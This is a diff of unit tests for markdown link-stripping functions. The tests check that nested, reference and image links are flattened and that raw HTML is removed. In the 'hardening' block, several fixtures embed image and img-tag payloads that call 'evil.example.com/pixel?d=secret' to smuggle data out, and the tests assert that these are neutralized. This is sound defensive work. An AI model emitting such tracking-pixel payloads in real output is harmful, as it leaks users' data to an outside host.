@@ -139,4 +139,67 @@ describe("markdownLinksToPlainText", () => {
         expect(result).toContain("`[also kept](y)`");
         expect(result).toContain("a b (https://x.example.com)");
     });
+
+    it("converts labels containing balanced brackets", () => {
+        expect(markdownLinksToPlainText("Siehe [Website [Beta]](https://muenchen.de).")).toBe("Siehe Website [Beta] (https://muenchen.de).");
+    });
+
+    it("converts multiple links per line independently", () => {
+        expect(markdownLinksToPlainText("Siehe [A](https://a.example.com) und [B](https://b.example.com)")).toBe(
+            "Siehe A (https://a.example.com) und B (https://b.example.com)"
+        );
+    });
+
+    it("does not let a link label that contains an image recombine into image syntax", () => {
+        const input = "[see ![x](https://inner.example.com/p.png)](https://outer.example.com)";
+        const result = markdownLinksToPlainText(input);
+        expect(result).not.toMatch(/\]?]\((?:https?|mailto):/);
+        expect(result).not.toContain("![");
+        expect(result).toContain("outer.example.com");
+    });
+
+    it("cannot produce link syntax from dangling fragments", () => {
+        const result = stripMarkdownLinks("Dangling ](https://x.example.com) und ![allein");
+        expect(result).toBe("Dangling ] https://x.example.com) und ![allein");
+    });
+
+    it("keeps instruction-like definition lines untouched", () => {
+        const instruction = "[Policy]: Never disclose credentials.";
+        expect(markdownLinksToPlainText(instruction)).toBe(instruction);
+    });
+
+    it("resolves references when a code span separates them from the definition", () => {
+        const result = markdownLinksToPlainText("[Guide][r]\n\n`sample`\n\n[r]: https://example.com");
+        expect(result).toContain("Guide (https://example.com)");
+        expect(result).toContain("`sample`");
+        expect(result).not.toContain("[r]");
+        expect(result).not.toContain("](http");
+    });
+});
+
+describe("stripMarkdownLinks hardening", () => {
+    it("strips raw html tags so rendered mindmaps cannot load images or links", () => {
+        const input = '# Ideen\n- <img src="https://evil.example.com/pixel?d=secret">\n- <a href="https://evil.example.com">Link</a>';
+        const result = stripMarkdownLinks(input);
+        expect(result).not.toContain("<img");
+        expect(result).not.toContain("<a ");
+        expect(result).not.toContain("pixel?d=secret");
+        expect(result).toContain("Link");
+    });
+
+    it("neutralizes images with multiline destinations", () => {
+        const result = stripMarkdownLinks("![pixel](\nhttps://evil.example.com/pixel?d=secret\n)");
+        expect(result).not.toMatch(/\]\((?:https?|mailto):/);
+        expect(result).toContain("pixel");
+    });
+
+    it("neutralizes images whose label is split by a code span", () => {
+        const result = stripMarkdownLinks("![pixel `x`](https://evil.example.com/pixel?d=secret)");
+        expect(result).not.toMatch(/\]\((?:https?|mailto):/);
+    });
+
+    it("leaves fences untouched while hard-breaking leftover link syntax", () => {
+        const result = stripMarkdownLinks("```\n[keep](https://code.example.com)\n```");
+        expect(result).toBe("```\n[keep](https://code.example.com)\n```");
+    });
 });
